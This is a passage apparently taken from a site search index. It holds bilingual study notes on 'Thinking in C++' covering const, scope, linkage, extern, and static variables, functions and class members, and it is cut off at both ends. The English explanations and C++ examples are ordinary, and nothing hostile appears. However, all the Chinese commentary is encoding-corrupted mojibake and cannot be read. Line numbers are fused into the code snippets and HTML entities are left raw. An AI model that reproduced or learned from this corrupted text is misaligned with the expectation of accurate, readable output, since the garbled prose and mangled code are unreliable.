howdyåœ¨å¸¸é‡åŒºï¼Œå®é™…ä¸Šå®ƒæ˜¯ä¸ªconst char*ï¼Œè™½ç„¶æ²¡åŠ constç¼–è¯‘èƒ½è¿‡ï¼Œä½†ä½¿ç”¨æŒ‡é’ˆxæ¥ä¿®æ”¹è¿™ä¸ªå­—ç¬¦ä¸²çš„å­—ç¬¦è¿è¡Œæ—¶ä¼šæŠ¥é”™ï¼Œå› ä¸ºå¸¸é‡åŒºåªè¯»ä¸å¯å†™ã€‚ å­—ç¬¦ä¸²æŒ‡é’ˆ12char *x = &quot;howdy&quot;;*(x + 1) = &#x27;A&#x27;; // ç¼–è¯‘èƒ½é€šè¿‡ï¼Œæ‰§è¡ŒæŠ¥é”™0xC0000005 abcdeåœ¨å †æ ˆï¼Œå¯è¯»å¯å†™ï¼Œç”¨æŒ‡é’ˆyæ¥ä¿®æ”¹è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯okçš„ã€‚ å­—ç¬¦ä¸²12char y[] = &quot;abcde&quot;;y[1] = &#x27;A&#x27;; // ç¼–è¯‘èƒ½é€šè¿‡ï¼Œä¹Ÿèƒ½æ‰§è¡Œ ç»•è¿‡ç¼–è¯‘å™¨å¯¹constçš„æ£€æŸ¥ constæ˜¯ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶åšæ£€æŸ¥ï¼Œè¿è¡Œæ—¶ï¼ˆRun timeï¼‰ç”¨æŒ‡é’ˆç…§æ ·èƒ½å»æ”¹ï¼Œåœ¨ä»£ç ä¸­ç”¨å¼ºè½¬æ¥ç»•è¿‡è¿™ç§é™åˆ¶ï¼Œä½†è¿™ä¸æ˜¯ä¸€ä¸ªå¥½çš„ç¼–ç¨‹ä¹ æƒ¯ åƒä½¿ç”¨æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªå¯¹è±¡ï¼Œç”¨æŒ‡é’ˆæ¥è®¿é—®è¿™ä¸ªå¯¹è±¡åŸæ„ç”¨privateé™åˆ¶è®¿é—®çš„æˆå‘˜ 12345678//: C08:PointerAssignment.cppint d = 1;const int e = 2;int *u = &amp;d; // OK -- d not const//! int* v = &amp;e; // Illegal -- e constint *w = (int *)&amp;e; // Legal but bad practice"},{"title":"static","path":"/wiki/Thinking_in_C++/static.html","content":"In both C and C++ the keyword static has two basic meanings, which unfortunately often step on each otherâ€™s toes: Static storage Allocated once at a fixed address; that is, the object is created in a special static data area rather than on the stack each time a function is called. Visibility of a name Local to a particular translation unit (and local to a class scope in C++, as you will see later). Here, static controls the visibility of a name, so that name cannot be seen outside the translation unit or class. This also describes the concept of linkage, which determines what names the linker will see. æ¦‚å¿µè¡¥å…… å­˜å‚¨ä½ç½® å˜é‡å­˜æ”¾åœ¨å“ªï¼Œå…¨å±€åŒºï¼Œæ ˆï¼Œå †ã€‚ å †ï¼šnewå‡ºæ¥çš„ å…¨å±€åŒºï¼šå‡½æ•°åœ°å€ï¼Œå…¨å±€å˜é‡ æ ˆï¼šå±€éƒ¨å˜é‡ ç”Ÿå‘½å‘¨æœŸ å˜é‡æ‰€åœ¨çš„å†…å­˜ä»åˆ†é…åˆ°é‡Šæ”¾çš„è¿™æ®µæ—¶é—´ ä½œç”¨åŸŸï¼ˆScopingï¼‰ Scoping rules tell you where a variable is valid, where it is created, and where it gets destroyed (i.e., goes out of scope). The scope of a variable extends from the point where it is defined to the first closing brace that matches the closest opening brace before the variable was defined. That is, a scope is defined by its â€œnearestâ€ set of braces. To illustrate: 123456789101112131415161718192021222324252627//: C03:Scope.cpp// How variables are scopedint main() &#123; int scp1; // scp1 visible here &#123; // scp1 still visible here //..... int scp2; // scp2 visible here //..... &#123; // scp1 &amp; scp2 still visible here //.. int scp3; // scp1, scp2 &amp; scp3 visible here // ... &#125; // &lt;-- scp3 destroyed here // scp3 not available here // scp1 &amp; scp2 still visible here // ... &#125; // &lt;-- scp2 destroyed here // scp3 &amp; scp2 not available here // scp1 still visible here //..&#125; // &lt;-- scp1 destroyed here///:~ The example above shows when variables are visible and when they are unavailable (that is, when they go out of scope). A variable can be used only when inside its scope. Scopes can be nested, indicated by matched pairs of braces inside other matched pairs of braces. Nesting means that you can access a variable in a scope that encloses the scope you are in. In the example above, the variable scp1 is available inside all of the other scopes, while scp3 is available only in the innermost scope. è¿æ¥(linkage) In an executing program, an identifier is represented by storage in memory that holds a variable or a compiled function body. Linkage describes this storage as it is seen by the linker. There are two types of linkage: internal linkage and external linkage. å†…éƒ¨é“¾æ¥ï¼ˆinternal linkageï¼‰ Internal linkage means that storage is created to represent the identifier only for the file being compiled. å†…éƒ¨é“¾æ¥æ„å‘³ç€å¯¹è±¡æˆ–å‡½æ•°åªåœ¨å®šä¹‰å®ƒçš„ç¼–è¯‘å•å…ƒå†…éƒ¨å¯è§ã€‚è¿™æ„å‘³ç€å³ä½¿å…¶ä»–æ–‡ä»¶ä¸­æœ‰ç›¸åŒåç§°çš„å˜é‡æˆ–å‡½æ•°ï¼Œå®ƒä»¬ä¹Ÿæ˜¯ä¸åŒçš„ï¼Œå„è‡ªåœ¨è‡ªå·±çš„ç¼–è¯‘å•å…ƒä¸­ç‹¬ç«‹å­˜åœ¨ã€‚ å¤–éƒ¨é“¾æ¥ï¼ˆExternal Linkageï¼‰ External linkage means that a single piece of storage is created to represent the identifier for all files being compiled. The storage is created once, and the linker must resolve all other references to that storage. å¤–éƒ¨é“¾æ¥æ„å‘³ç€åœ¨å¤šä¸ªç¼–è¯‘å•å…ƒä¸­å¯ä»¥è®¿é—®åŒä¸€ä¸ªå¯¹è±¡æˆ–å‡½æ•°ã€‚ å¦‚æœä½ åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å£°æ˜äº†ä¸€ä¸ªå…¨å±€å˜é‡æˆ–å‡½æ•°ï¼Œä½ å¯ä»¥åœ¨å…¶ä»–æ–‡ä»¶ä¸­è®¿é—®å®ƒï¼Œåªè¦ä½ åœ¨é‚£äº›æ–‡ä»¶ä¸­æä¾›äº†é€‚å½“çš„å£°æ˜ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å®šä¹‰äº†ä¸€ä¸ªå‡½æ•° void myFunction()ï¼Œå¹¶ä¸”åœ¨å¦ä¸€ä¸ªæ–‡ä»¶ä¸­å£°æ˜äº†è¿™ä¸ªå‡½æ•°ï¼ˆé€šå¸¸é€šè¿‡åŒ…å«ä¸€ä¸ªå¤´æ–‡ä»¶ï¼‰ï¼Œé‚£ä¹ˆä½ å¯ä»¥åœ¨ç¬¬äºŒä¸ªæ–‡ä»¶ä¸­è°ƒç”¨ myFunction() å‡½æ•°ä¹‹å¤–çš„æ‰€æœ‰å˜é‡ï¼ˆåœ¨C++ä¸­é™¤äº†constï¼‰å’Œå‡½æ•°å®šä¹‰é»˜è®¤ä¸ºå¤–éƒ¨è¿æ¥ï¼Œä¹Ÿå¯ä»¥åœ¨å®šä¹‰æ—¶ä½¿ç”¨å…³é”®å­—externæ˜¾å¼æŒ‡å®šæ ‡è¯†ç¬¦å…·æœ‰å¤–éƒ¨è¿æ¥ã€‚ä½†é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬éƒ½æ˜¯çœç•¥äº†externã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨æ–‡ä»¶ä½œç”¨åŸŸï¼ˆfile scopeï¼‰çš„nameæ˜¯external linkageï¼Œå¯¹æ‰€æœ‰ç¼–è¯‘å•å…ƒå¯è§ï¼Œæ¯”å¦‚ä¸€ä¸ªå…¨å±€çš„å˜é‡å’Œå‡½æ•°åï¼Œå¯ä»¥ä½¿ç”¨staticå…³é”®å­—å°†ä¸€ä¸ªå…¨å±€çš„å˜é‡/å‡½æ•°æ”¹ä¸ºå†…éƒ¨é“¾æ¥ï¼ˆinternal linkageï¼‰å±æ€§ extern externä¸»è¦ç”¨äºä¸¤ä¸ªæ–¹é¢ï¼šå£°æ˜å¤–éƒ¨é“¾æ¥çš„å˜é‡æˆ–å‡½æ•°ï¼Œå’Œåœ¨æŸäº›æƒ…å†µä¸‹æ˜¾å¼å£°æ˜å‡½æ•°åŸå‹ã€‚æ˜¾å¼å£°æ˜å‡½æ•°åŸå‹ä¸Šé¢æåˆ°è¿‡äº†ã€‚è¯´ä¸‹å£°æ˜å¤–éƒ¨é“¾æ¥çš„å˜é‡æˆ–å‡½æ•°è¿™ä¸ªç”¨é€”ï¼š The extern keyword has already been briefly described and demonstrated. It tells the compiler that a variable or a function exists, even if the compiler hasnâ€™t yet seen it in the file currently being compiled. This variable or function may be defined in another file or further down in the current file. As an example of the latter: 123456789101112131415161718//: C03:Forward.cpp// Forward function &amp; data declarations#include &lt;iostream&gt;using namespace std;// This is not actually external, but the // compiler must be told it exists somewhere:extern int i; extern void func();int main() &#123; i = 0; func();&#125;int i; // The data definitionvoid func() &#123; i++; cout &lt;&lt; i;&#125; ///:~ When the compiler encounters the declaration â€˜extern int iâ€™, it knows that the definition for i must exist somewhere as a global variable. When the compiler reaches the definition of i, no other declaration is visible, so it knows it has found the same i declared earlier in the file. If you were to define i as static, you would be telling the compiler that i is defined globally (via the extern), but it also has file scope (via the static), so the compiler will generate an error. externå‘Šè¯‰ç¼–è¯‘å™¨elsewhereä¼šæœ‰è¿™ä¸ªå˜é‡iï¼Œäºæ˜¯ç¼–è¯‘å°±èƒ½é€šè¿‡ï¼Œlinkæ—¶ç”±é“¾æ¥å™¨å»æ‰¾ã€‚ ä»…ä»visibilityä¸Šå¯¹æ¯”ï¼Œextrenè¡¨ç¤ºè¿™ä¸ªåå­—å¯¹æ‰€æœ‰translation unitséƒ½å¯è§ï¼Œæ˜¯staticçš„oppositeï¼ˆvisible only in this translation unitï¼‰ 1234int a = 0;//ç­‰ä»·å†™æ³•extern int a = 0; ä½†å¦‚æœæ˜¯staticï¼Œåˆ™è¡¨ç¤ºaè¿™ä¸ªåå­—åªåœ¨å½“å‰æ–‡ä»¶å¯è§ 1static int a = 0; static elements in C/C++ Static free functions å‡½æ•°ï¼ˆéæˆå‘˜å‡½æ•°ï¼‰VSstatic å‡½æ•°ï¼ˆéæˆå‘˜å‡½æ•°ï¼‰ å‡½æ•°åæœ¬èº«å°±æ˜¯å…¨å±€çš„ å­˜å‚¨ç±»å‹ å…¨å±€ -&gt; ä¸å˜ å…¨å±€ ä½œç”¨åŸŸ æ–‡ä»¶ä½œç”¨åŸŸ -&gt; æ”¹å˜ å½“å‰æ–‡ä»¶ é“¾æ¥å±æ€§ å¤–éƒ¨é“¾æ¥ -&gt; æ”¹å˜ å†…éƒ¨é“¾æ¥ 12345// external linkagevoid f();// ç­‰ä»·å†™æ³•extern void f(); åŠ staticå°±è¡¨æ˜å‡½æ•°f()åªåœ¨å½“å‰æ–‡ä»¶å¯è§ï¼Œæœ‰æ—¶ç§°ä½œæ–‡ä»¶é™æ€ï¼ˆfile staticï¼‰ 1static void f(); static local variables å±€éƒ¨å˜é‡ï¼ˆåŸºæœ¬ç±»å‹ï¼‰VSstatic å±€éƒ¨å˜é‡ï¼ˆåŸºæœ¬ç±»å‹ï¼‰ å­˜å‚¨ç±»å‹ æ ˆ -&gt; æ”¹å˜ å…¨å±€ ä½œç”¨åŸŸ å‡½æ•°ä½œç”¨åŸŸ -&gt; ä¸å˜ å‡½æ•°ä½œç”¨åŸŸ åˆå§‹åŒ–æ—¶æœºï¼šå‡½æ•°ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨ åˆå§‹åŒ–çš„å€¼ï¼šå¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™æ˜¯0 Example: num_callså°†åœ¨æ¯æ¬¡å‡½æ•°æ‰§è¡Œæ—¶å€™++123456void f()&#123; static int num_calls = 0; //... num_calls++;&#125; // å…¨å±€å˜é‡ï¼Œä½†åªèƒ½åœ¨å‡½æ•°é‡Œè®¿é—® å±€éƒ¨å˜é‡ï¼ˆå¯¹è±¡ï¼‰VSstatic å±€éƒ¨å˜é‡ï¼ˆå¯¹è±¡ï¼‰ å­˜å‚¨ç±»å‹ æ ˆ -&gt; æ”¹å˜ å…¨å±€ ä½œç”¨åŸŸ å‡½æ•°ä½œç”¨åŸŸ -&gt; ä¸å˜ å‡½æ•°ä½œç”¨åŸŸ åˆå§‹åŒ–æ—¶æœºï¼šå‡½æ•°ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨ï¼Œç”±æ„é€ å‡½æ•°è¿›è¡Œåˆå§‹åŒ– åˆå§‹åŒ–çš„å€¼ï¼šçœ‹æ„é€ å‡½æ•°å®ç° Example g_globalï¼š File1ä¸­çš„g_globalæ˜¯ä¸ªå…¨å±€å˜é‡ï¼Œå¯¹æ‰€æœ‰translation unitså¯è§ï¼Œæ‰€ä»¥åœ¨File12ä¸­å¯ä»¥ç”¨extern int g_globalæ¥è¡¨æ˜g_globalå®šä¹‰åœ¨åˆ«å¤„ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨g_global1äº†ã€‚ s_localï¼š staticï¼Œåªå¯¹å½“å‰æ–‡ä»¶å¯è§ã€‚å³ä½¿File2ä¸­ç”¨extern int s_localè¡¨æ˜s_localå®šä¹‰åœ¨åˆ«å¤„ï¼Œç¼–è¯‘èƒ½è¿‡ï¼Œä½†linkæ—¶è¿‡ä¸å»ï¼ˆFile1è¯´s_localåªç»™è‡ªå·±è¿™ä¸ªæ–‡ä»¶ç”¨ï¼‰ hiddenï¼š staticï¼Œå‡½æ•°ååªå¯¹å½“å‰æ–‡ä»¶å¯è§ï¼ŒFile2ä¸å¯è§ï¼Œä¸å¯ä½¿ç”¨ Confusion é€šè¿‡ä¸Šé¢çš„ä¾‹å­ï¼Œå¯ä»¥å‘ç°ï¼Œæ­£å› ä¸ºstaticå…³é”®å­—å¯ä»¥è¡¨ç¤ºä¸¤ç§å«ä¹‰ï¼ˆå­˜å‚¨ç±»å‹å’Œå¯è§æ€§ï¼‰ï¼Œæ‰€ä»¥ä¼šé€ æˆç†è§£ä¸Šçš„å›°æ‰°ã€‚ç»™å…¨å±€å˜é‡åŠ staticï¼Œæ”¹çš„æ˜¯é“¾æ¥å±æ€§ï¼›ç»™å±€éƒ¨å˜é‡åŠ staticï¼Œæ”¹çš„æŒä¹…å­˜å‚¨ï¼›ç»™å‡½æ•°ï¼ˆéæˆå‘˜å‡½æ•°ï¼‰åŠ staticï¼Œæ”¹çš„æ˜¯é“¾æ¥å±æ€§ã€‚æ¢ä¸ªè§’åº¦å…¶å®å¯ä»¥ç†è§£ï¼ŒåŠ ä¸Šstaticåï¼Œæ— æ³•åŒæ—¶å°†ä¸¤ä¸ªå«ä¹‰éƒ½ä¿®æ”¹ï¼ŒåŠ ä¸Šstaticåå˜çš„åªæœ‰ä¸€ä¸ªå«ä¹‰ï¼Œå¦‚ï¼š å…¨å±€å˜é‡ï¼Œæœ¬èº«å°±æ˜¯å…¨å±€å­˜å‚¨ï¼ŒåŠ äº†staticè¿˜æ˜¯å…¨å±€å­˜å‚¨ï¼Œæ‰€ä»¥åŠ staticå°±æ˜¯é™åˆ¶å¯è§æ€§ å±€éƒ¨å˜é‡ï¼Œæœ¬èº«å¯è§æ€§æ˜¯åœ¨å‡½æ•°ä½œç”¨åŸŸï¼ŒåŠ äº†staticå¯è§æ€§è¿˜æ˜¯åœ¨å‡½æ•°ä½œç”¨åŸŸé‡Œï¼Œæ‰€ä»¥åŠ staticå°±æ˜¯ä¿®æ”¹ä¸ºæŒä¹…å­˜å‚¨ å‡½æ•°ï¼ˆéæˆå‘˜ï¼‰ï¼Œå‡½æ•°åœ°å€æœ¬èº«å°±æ˜¯å…¨å±€åœ°å€ï¼ŒåŠ äº†staticè¿˜æ˜¯å…¨å±€ï¼Œæ‰€ä»¥åŠ staticå°±æ˜¯é™åˆ¶å¯è§æ€§ æ ¸å¿ƒç‚¹è¿˜æ˜¯ä»staticçš„ä¸¤ç§åŸºæœ¬å«ä¹‰å­˜å‚¨ç±»å‹å’Œå¯è§æ€§æ–¹é¢è¿›è¡Œåˆ†æã€‚ é™æ€å¯¹è±¡çš„æ„é€ å’Œææ„è°ƒç”¨é¡ºåº Construction occurs when definition is encountered Constructor called at-most once æ„é€ åªå‘ç”Ÿä¸€æ¬¡ï¼Œåœ¨å‡½æ•°ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨æ—¶å‘ç”Ÿ The constructor arguments must be satisfied Destruction takes place on exit from program ææ„åœ¨ç¨‹åºç»“æŸæ—¶å‘ç”Ÿ Compiler assures LIFO order of destructors æ‰€æœ‰è¢«åˆ›å»ºçš„å¯¹è±¡çš„ææ„å‡½æ•°æŒ‰åˆ›å»ºæ—¶ç›¸åçš„é¡ºåºè¢«è°ƒç”¨ ææ„å‡½æ•°å…·ä½“è°ƒç”¨æ—¶æœºå¤šæ•°æƒ…å†µä¸‹main()å‡½æ•°ç»“å°¾æ˜¯é€šè¿‡è°ƒç”¨exit()æ¥ç»“æŸç¨‹åºï¼Œåœ¨exit()è¢«è°ƒç”¨æ—¶ææ„è¢«è°ƒç”¨ã€‚å¦‚æœç”¨Cæ ‡å‡†åº“çš„abort()å‡½æ•°æ¥é€€å‡ºç¨‹åºï¼Œé™æ€å¯¹è±¡çš„ææ„å‡½æ•°ä¸ä¼šè¢«è°ƒç”¨ã€‚å¯ä»¥ç”¨æ ‡å‡†Cåº“å‡½æ•°atexit()æ¥æŒ‡å®šå½“å‰ç¨‹åºè·³å‡ºmain()ï¼ˆæˆ–è°ƒç”¨exit()ï¼‰æ—¶åº”æ‰§è¡Œçš„æ“ä½œã€‚è¿™æ ·ï¼Œåœ¨è·³å‡ºmain()æˆ–è°ƒç”¨exit()ä¹‹å‰æŒ‰ï¼Œç”¨atexit()æ³¨å†Œçš„å‡½æ•°å¯ä»¥åœ¨æ‰€æœ‰å¯¹è±¡çš„ææ„å‡½æ•°ä¹‹å‰è¢«è°ƒç”¨ã€‚ 12345678910111213141516171819202122232425262728293031323334//: C10:StaticDestructors.cpp// Static object destructors#include &lt;fstream&gt;using namespace std;ofstream out(&quot;statdest.out&quot;); // Trace fileclass Obj &#123; char c; // Identifierpublic: Obj(char cc) : c(cc) &#123; out &lt;&lt; &quot;Obj::Obj() for &quot; &lt;&lt; c &lt;&lt; endl; &#125; ~Obj() &#123; out &lt;&lt; &quot;Obj::~Obj() for &quot; &lt;&lt; c &lt;&lt; endl; &#125;&#125;;Obj a(&#x27;a&#x27;); // Global (static storage)// Constructor &amp; destructor always calledvoid f() &#123; static Obj b(&#x27;b&#x27;);&#125;void g() &#123; static Obj c(&#x27;c&#x27;);&#125;int main() &#123; out &lt;&lt; &quot;inside main()&quot; &lt;&lt; endl; f(); // Calls static constructor for b // g() not called out &lt;&lt; &quot;leaving main()&quot; &lt;&lt; endl;&#125; ///:~ 123456Obj::Obj() for ainside main()Obj::Obj() for bleaving main()Obj::~Obj() for bObj::~Obj() for a The constructor for a is called before main( ) is entered, and the constructor for b is called only because f( ) is called. When main( ) exits, the destructors for the objects that have been constructed are called in reverse order of their construction. This means that if g( ) is called, the order in which the destructors for b and c are called depends on whether f( ) or g( ) is called first. Static initialization dependency æœ‰å¤šä¸ªæ–‡ä»¶éƒ½æœ‰ä½œç”¨åŸŸä¸ºå¤šä¸ªtranslation unitsçš„é™æ€å¯¹è±¡ï¼Œè¿™äº›é™æ€å¯¹è±¡ä¹‹é—´äº’æœ‰ä¾èµ–ï¼Œå¦‚ ä¸€ä¸ªæ–‡ä»¶12extern int y;int x = y + 1; å¦ä¸€ä¸ªæ–‡ä»¶12extern int x;int y = x + 1; è°å…ˆåˆå§‹åŒ–è°ååˆå§‹åŒ–çš„é¡ºåºæ˜¯ä¸ç¡®å®šçš„ è§£å†³åŠæ³•ï¼š ä¸ä½¿ç”¨ï¼Œé¿å…é™æ€å¯¹è±¡ä¹‹é—´åˆå§‹åŒ–çš„ä¾èµ– å°†æ‰€æœ‰æœ‰ä¾èµ–çš„è¿™äº›é™æ€å¯¹è±¡æ”¾åˆ°åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œæ–‡ä»¶ä¸­çš„é¡ºåºå°±æ˜¯åˆå§‹åŒ–çš„é¡ºåº ä¸¤ç§åŠæ³• 10: Name ControlWhat to doæ ‡é¢˜ Static members in C++ æœ‰æ—¶æˆ‘ä»¬éœ€è¦ä¸€ä¸ªåœ¨æ‰€æœ‰ç±»çš„å¯¹è±¡éƒ½å…±äº«çš„å˜é‡ï¼Œåœ¨Cä¸­å¯ä»¥ç”¨å…¨å±€å˜é‡å®ç°ï¼Œä½†å…¨å±€å˜é‡æ²¡æœ‰éšè—åœ¨ç±»çš„å†…éƒ¨ã€‚å¦‚æœæ—¢èƒ½è®©æ‰€æœ‰ç±»çš„å¯¹è±¡éƒ½å…±äº«ï¼Œå¹¶ä¸”èƒ½æ”¾åœ¨ç±»é‡Œï¼Œé‚£å°±å†ç†æƒ³ä¸è¿‡äº†ã€‚staticæ•°æ®æˆå‘˜å°±æ˜¯è¿™ä¸ªé—®é¢˜çš„è§£å†³æ–¹æ³•ã€‚ Static members åœ¨Cä¸­ï¼Œstaticæ„å‘³ç€Hiddenå’ŒPersistentã€‚membersæœ¬èº«åœ¨ç±»ä¸­ï¼Œç”±access rules(è®¿é—®æ§åˆ¶ç¬¦ï¼Œpublicï¼Œprotectedï¼Œprivateï¼‰æ¥åšHiddençš„äº‹ï¼Œæ‰€ä»¥staticç”¨æ¥å®ç°Hiddençš„ä»»åŠ¡ç»“æŸäº†ï¼ˆåƒå…ˆå‰åœ¨Cé‚£æ ·ï¼Œå°†nameä¿®æ”¹ä¸ºæœ¬æ–‡ä»¶å¯è§ï¼‰ã€‚åŠ ä¸Šstaticåè¡¨ç¤ºè¿™ä¸ªæˆå‘˜æ˜¯å…¨å±€çš„ï¼Œèµ·Persistentçš„ä½œç”¨ï¼Œè¡¨ç¤ºè¿™ä¹ˆä¸€ä¸ªä¸œè¥¿ï¼Œå®ƒä¸ä¼šéšç€å¯¹è±¡çš„ä¸åŒè€Œä¸åŒï¼Œå®ƒæ˜¯å¯¹è±¡instancesä¹‹é—´å…±äº«çš„ä¸œè¥¿ã€‚æ‰€ä»¥è¯´staticæˆå‘˜å˜é‡æ˜¯class-wideï¼ˆç±»çº§åˆ«ï¼‰ä¸Šçš„ä¸œè¥¿ã€‚ static memberä¹Ÿæ˜¯ç±»çš„æˆå‘˜ï¼Œç±»å¤–å¯¹é™æ€æˆå‘˜å˜é‡çš„è®¿é—®éœ€è¦éµå®ˆaccess rules(è®¿é—®æ§åˆ¶ç¬¦ï¼Œpublicï¼Œprotectedï¼Œprivateï¼‰ é™æ€æˆå‘˜å˜é‡å­˜å‚¨åœ¨å…¨å±€åŒºï¼Œä¸”å¿…é¡»åœ¨ä¸€ä¸ªåœ°æ–¹å®šä¹‰ï¼ˆdefinitionï¼‰ ç±»ä¸­çš„æ˜¯declarationï¼Œdeclarationå¹¶æ²¡åˆ†ç©ºé—´ã€‚å¿…é¡»æœ‰ä¸€ä¸ªåœ°æ–¹å†™ä¸Šdefinitionï¼Œç¼–è¯‘å™¨æ‰ä¼šç»™é™æ€æˆå‘˜å˜é‡åˆ†ç©ºé—´ã€‚é€šå¸¸æ˜¯.hæ”¾ç±»çš„declarationï¼Œåœ¨.cppä¸­å†™definition .h12345678class A&#123;private: static int i;public: //...&#125;; æ­£ç¡®çš„å†™æ³•.cpp12// definitionint A::i; // ok,ç¼–è¯‘å™¨ä¼šé»˜è®¤åˆå§‹åŒ–ä¸º0.cpp12// definitionint A::i = 20; // ok,ç¼–è¯‘å™¨ä¼šåˆå§‹åŒ–ä¸º20é”™è¯¯çš„å†™æ³•ä»è®¾è®¡ä¸Šæ¥è®²ï¼Œstaticé™åˆ¶A::iåªåœ¨å½“å‰æ–‡ä»¶å¯è§ï¼Œä½†A::iå·²ç»åœ¨ç±»Aä¸­æ˜¯privateï¼Œprivateæ˜¯è¯´åªæœ‰ç±»æ‰èƒ½è®¿é—®ï¼Œè¿™ä¼šå†²çªã€‚æ‰€ä»¥definitionè¿™é‡Œå‰é¢ä¸ç”¨å†åŠ ä¸Šstatic.cpp12// definitionstatic int A::i; //error é™æ€æˆå‘˜å˜é‡æ˜¯æ‰€æœ‰å¯¹è±¡instanceså…±äº«çš„ï¼Œæ˜¯å±äºæ•´ä¸ªç±»çš„ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥ï¼š ä¸èƒ½åœ¨æ„é€ å‡½æ•°åˆå§‹åŒ–åˆ—è¡¨ä¸­è¿›è¡Œåˆå§‹åŒ–ï¼Œå› ä¸ºé™æ€æˆå‘˜å˜é‡ä¸æ˜¯å¦æœ‰å¯¹è±¡å®ä¾‹æ— å…³ã€‚åˆå§‹åŒ–åˆ—è¡¨åªèƒ½å¯¹éé™æ€æˆå‘˜å˜é‡è¿›è¡Œåˆå§‹åŒ– å¯ä»¥åœ¨æ„é€ å‡½æ•°çš„å‡½æ•°ä½“ä¸­è¿›è¡Œèµ‹å€¼ï¼Œå› ä¸ºé™æ€æˆå‘˜å˜é‡ä¹Ÿæ˜¯ç±»çš„æˆå‘˜ï¼Œç±»ä¸­çš„å‡½æ•°å¯ä»¥è®¿é—®åˆ°ã€‚å¯¹è±¡ä¹Ÿå¯ä»¥é€šè¿‡thisæŒ‡é’ˆè®¿é—®åˆ° ä¸¤ç§è®¿é—®æ–¹å¼ 123456789101112131415class A&#123;public: //publicï¼Œæ‰€ä»¥mainä¸­å¯ä»¥ç›´æ¥è®¿é—®åˆ°i static int i; //å¦‚æœprivateçš„ï¼Œmainä¸­çš„ä¸¤è¡Œä¹Ÿè®¿é—®ä¸åˆ°&#125;;int A::i = 10;int main()&#123; A a; int r1 = A::i; //æ–¹å¼ä¸€ï¼šç±»å::é™æ€æ•°æ®æˆå‘˜ int r2 = a.i; //æ–¹å¼äºŒï¼šç±»å¯¹è±¡å é™æ€æ•°æ®æˆå‘˜&#125; Static member function static member functionä¹Ÿæ˜¯ç±»çš„æˆå‘˜ï¼Œç±»å¤–å¯¹é™æ€æˆå‘˜å˜é‡çš„è®¿é—®éœ€è¦éµå®ˆaccess rules(è®¿é—®æ§åˆ¶ç¬¦ï¼Œpublicï¼Œprotectedï¼Œprivateï¼‰ å‡ºç°åœ¨ç±»å¤–çš„å‡½æ•°å®šä¹‰ï¼ˆdefinitionï¼‰ä¸ç”¨å†å†™å…³é”®å­—static é™æ€æˆå‘˜å‡½æ•°åªèƒ½è®¿é—®é™æ€æˆå‘˜å˜é‡å’Œå…¶ä»–é™æ€æˆå‘˜å‡½æ•° å› ä¸ºï¼Œé™æ€æˆå‘˜å‡½æ•°ä¸æ˜¯å¦æœ‰å¯¹è±¡å®ä¾‹æ— å…³ï¼Œé‚£ä¹Ÿå°±æ²¡æœ‰thisæŒ‡é’ˆ(thisæŒ‡é’ˆæŒ‡å‘å½“å‰è°ƒç”¨æˆå‘˜å‡½æ•°çš„å¯¹è±¡)ï¼Œæ²¡æœ‰thisæŒ‡é’ˆï¼Œä¹Ÿå°±è®¿é—®ä¸åˆ°éé™æ€æˆå‘˜ï¼Œä¹Ÿä¸èƒ½è°ƒç”¨éé™æ€çš„æˆå‘˜å‡½æ•° 1234567891011121314151617181920212223242526272829303132333435363738//: C10:StaticMemberFunctions.cppclass X &#123;private: int i; static int j;public: X(int ii = 0) : i(ii) &#123; // Non-static member function can access static member function or data: j = i; &#125; int val() const &#123; return i; &#125; static int incr() &#123; //! i++; // Error: static member functioncannot access non-static member data return ++j; &#125; static int f() &#123; //! val(); // Error: static member function cannot access non-static member function return incr(); // OK -- calls static &#125;&#125;;int X::j = 0;int main() &#123; X x; X* xp = &amp;x; x.f(); xp-&gt;f(); X::f(); // Only works with static members&#125; ///:~ è°ƒç”¨é™æ€æˆå‘˜å‡½æ•°çš„ä¸¤ç§æ–¹å¼ 1234567891011121314151617//: C10:SimpleStaticMemberFunction.cpp class X &#123;public: static void f()&#123;&#125;;&#125;;int main() &#123; //æ–¹å¼ä¸€ X::f(); //æ–¹å¼äºŒ X x; x.f();&#125; However, itâ€™s more typical to call a static member function by itself, without any specific object, using the scope-resolution operator é™æ€æˆå‘˜å‡½æ•°æä¾›äº†ä¸€ç§æ–¹æ³•ï¼šåœ¨ä¸€ä¸ªç±»æ²¡æœ‰åˆ›å»ºä»»ä½•å¯¹è±¡ä¹‹å‰æ¥è°ƒç”¨ç±»ä¸­çš„å‡½æ•°ï¼›æœ‰è¿™ä¹ˆä¸€ä¸ªä¸œè¥¿ï¼Œä¸æ˜¯å¦å­˜åœ¨ç±»çš„å¯¹è±¡æ— å…³çš„ é™æ€æˆå‘˜å˜é‡åŒç†ï¼šåœ¨ä¸€ä¸ªç±»æ²¡æœ‰åˆ›å»ºä»»ä½•å¯¹è±¡ç¤ºä¾‹ä¹‹å‰ï¼Œå°±èƒ½è®©å…¶ä»–äººæ¥è®¿é—®ç±»ä¸­çš„æ•°æ® æ€»ç»“ å°ç»“ Uses of \"static\" in C++ Static free functions Internal Linkage (deprecated) Static global variables Internal Linkage (deprecated) Static local variables Persistent storage Static member variables Shared by all instances Static member function Shared by all instances, can only access static member variables Static free functionsï¼šæŒ‡çš„æ˜¯åœ¨ç±»å¤–å®šä¹‰çš„ã€å…·æœ‰é™æ€é“¾æ¥ï¼ˆinternal 